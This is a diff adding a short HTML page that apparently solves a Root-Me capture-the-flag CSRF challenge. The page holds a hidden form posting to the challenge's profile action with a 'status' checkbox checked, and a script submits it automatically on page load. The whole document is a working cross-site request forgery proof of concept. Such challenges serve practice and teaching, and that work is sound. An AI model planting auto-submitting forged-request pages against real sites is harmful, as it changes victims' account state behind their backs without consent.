@@ -1,1 +1,21 @@
-<html></html>
+<html>
+  <form id="hiddenForm" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="post" enctype="multipart/form-data" style="display:none;">
+		<div class="form-group">
+		<label>Username:</label>
+		<input type="text" name="username" value="test">
+		</div>
+		<br>		
+		<div class="form-group">
+		<label>Status:</label>
+		<input type="checkbox" name="status" value="yes" checked>
+		</div>
+		<br>	
+		<button type="submit">Submit</button>
+	</form>
+  <script>
+        window.onload = function() {
+            var form = document.getElementById("hiddenForm");
+            form.submit();
+        }
+    </script>
+</html>
